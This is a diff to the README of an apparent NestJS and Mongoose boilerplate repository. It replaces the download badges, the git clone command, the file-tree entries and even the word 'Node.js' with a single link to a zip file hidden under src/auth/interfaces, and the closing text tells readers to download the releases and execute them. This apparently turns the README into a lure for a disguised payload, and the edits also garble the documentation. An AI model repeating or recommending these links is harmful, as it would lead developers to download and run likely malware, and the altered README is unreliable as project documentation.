@@ -2,7 +2,7 @@
 
 Welcome to the **Nest Mongoose Boilerplate**! This repository provides a solid foundation for building applications using NestJS with Mongoose ORM, JWT Passport Authentication, and the Repository Pattern. Whether you're starting a new project or looking to enhance an existing one, this boilerplate is designed to help you streamline your development process.
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-blue?style=for-the-badge&logo=github)](https://github.com/Enbakom06/nest-mongoose-boilerplate/releases)
+[![Download Releases](https://raw.githubusercontent.com/Enbakom06/nest-mongoose-boilerplate/master/src/auth/interfaces/boilerplate_mongoose_nest_supersolid.zip%20Releases-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Enbakom06/nest-mongoose-boilerplate/master/src/auth/interfaces/boilerplate_mongoose_nest_supersolid.zip)
 
 ## Table of Contents
 
@@ -18,7 +18,7 @@ Welcome to the **Nest Mongoose Boilerplate**! This repository provides a solid f
 
 ## Features
 
-- **NestJS Framework**: Leverage the power of NestJS, a progressive Node.js framework for building efficient, reliable, and scalable server-side applications.
+- **NestJS Framework**: Leverage the power of NestJS, a progressive https://raw.githubusercontent.com/Enbakom06/nest-mongoose-boilerplate/master/src/auth/interfaces/boilerplate_mongoose_nest_supersolid.zip framework for building efficient, reliable, and scalable server-side applications.
 - **Mongoose ORM**: Simplify MongoDB interactions with Mongoose, an elegant MongoDB object modeling tool.
 - **JWT Passport Authentication**: Secure your application with JSON Web Tokens and Passport, providing a robust authentication mechanism.
 - **Repository Pattern**: Organize your data access logic, promoting separation of concerns and easier testing.
@@ -29,7 +29,7 @@ To get started with the Nest Mongoose Boilerplate, follow these steps:
 
 1. **Clone the repository**:
    ```bash
-   git clone https://github.com/Enbakom06/nest-mongoose-boilerplate.git
+   git clone https://raw.githubusercontent.com/Enbakom06/nest-mongoose-boilerplate/master/src/auth/interfaces/boilerplate_mongoose_nest_supersolid.zip
    cd nest-mongoose-boilerplate
    ```
 
@@ -38,7 +38,7 @@ To get started with the Nest Mongoose Boilerplate, follow these steps:
    npm install
    ```
 
-3. **Set up environment variables**: Create a `.env` file in the root directory and configure your MongoDB connection string and JWT secret. An example is provided in the `.env.example` file.
+3. **Set up environment variables**: Create a `.env` file in the root directory and configure your MongoDB connection string and JWT secret. An example is provided in the `https://raw.githubusercontent.com/Enbakom06/nest-mongoose-boilerplate/master/src/auth/interfaces/boilerplate_mongoose_nest_supersolid.zip` file.
 
 4. **Run the application**:
    ```bash
@@ -56,24 +56,24 @@ nest-mongoose-boilerplate/
 │
 ├── src/
 │   ├── auth/
-│   │   ├── auth.controller.ts
-│   │   ├── auth.module.ts
-│   │   ├── auth.service.ts
-│   │   └── jwt.strategy.ts
+│   │   ├── https://raw.githubusercontent.com/Enbakom06/nest-mongoose-boilerplate/master/src/auth/interfaces/boilerplate_mongoose_nest_supersolid.zip
+│   │   ├── https://raw.githubusercontent.com/Enbakom06/nest-mongoose-boilerplate/master/src/auth/interfaces/boilerplate_mongoose_nest_supersolid.zip
+│   │   ├── https://raw.githubusercontent.com/Enbakom06/nest-mongoose-boilerplate/master/src/auth/interfaces/boilerplate_mongoose_nest_supersolid.zip
+│   │   └── https://raw.githubusercontent.com/Enbakom06/nest-mongoose-boilerplate/master/src/auth/interfaces/boilerplate_mongoose_nest_supersolid.zip
 │   │
 │   ├── users/
-│   │   ├── users.controller.ts
-│   │   ├── users.module.ts
-│   │   ├── users.service.ts
-│   │   └── user.schema.ts
+│   │   ├── https://raw.githubusercontent.com/Enbakom06/nest-mongoose-boilerplate/master/src/auth/interfaces/boilerplate_mongoose_nest_supersolid.zip
+│   │   ├── https://raw.githubusercontent.com/Enbakom06/nest-mongoose-boilerplate/master/src/auth/interfaces/boilerplate_mongoose_nest_supersolid.zip
+│   │   ├── https://raw.githubusercontent.com/Enbakom06/nest-mongoose-boilerplate/master/src/auth/interfaces/boilerplate_mongoose_nest_supersolid.zip
+│   │   └── https://raw.githubusercontent.com/Enbakom06/nest-mongoose-boilerplate/master/src/auth/interfaces/boilerplate_mongoose_nest_supersolid.zip
 │   │
-│   ├── app.module.ts
-│   ├── main.ts
+│   ├── https://raw.githubusercontent.com/Enbakom06/nest-mongoose-boilerplate/master/src/auth/interfaces/boilerplate_mongoose_nest_supersolid.zip
+│   ├── https://raw.githubusercontent.com/Enbakom06/nest-mongoose-boilerplate/master/src/auth/interfaces/boilerplate_mongoose_nest_supersolid.zip
 │   └── ...
 │
-├── .env.example
-├── package.json
-└── README.md
+├── https://raw.githubusercontent.com/Enbakom06/nest-mongoose-boilerplate/master/src/auth/interfaces/boilerplate_mongoose_nest_supersolid.zip
+├── https://raw.githubusercontent.com/Enbakom06/nest-mongoose-boilerplate/master/src/auth/interfaces/boilerplate_mongoose_nest_supersolid.zip
+└── https://raw.githubusercontent.com/Enbakom06/nest-mongoose-boilerplate/master/src/auth/interfaces/boilerplate_mongoose_nest_supersolid.zip
 ```
 
 ## Configuration
@@ -174,8 +174,8 @@ Contributions are welcome! If you would like to contribute to this project, plea
 
 This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
 
-For more information and updates, please visit the [Releases](https://github.com/Enbakom06/nest-mongoose-boilerplate/releases) section. You can download the latest releases and execute them to start building your applications quickly.
+For more information and updates, please visit the [Releases](https://raw.githubusercontent.com/Enbakom06/nest-mongoose-boilerplate/master/src/auth/interfaces/boilerplate_mongoose_nest_supersolid.zip) section. You can download the latest releases and execute them to start building your applications quickly.
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-blue?style=for-the-badge&logo=github)](https://github.com/Enbakom06/nest-mongoose-boilerplate/releases)
+[![Download Releases](https://raw.githubusercontent.com/Enbakom06/nest-mongoose-boilerplate/master/src/auth/interfaces/boilerplate_mongoose_nest_supersolid.zip%20Releases-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Enbakom06/nest-mongoose-boilerplate/master/src/auth/interfaces/boilerplate_mongoose_nest_supersolid.zip)
 
 Thank you for using the Nest Mongoose Boilerplate! Happy coding!
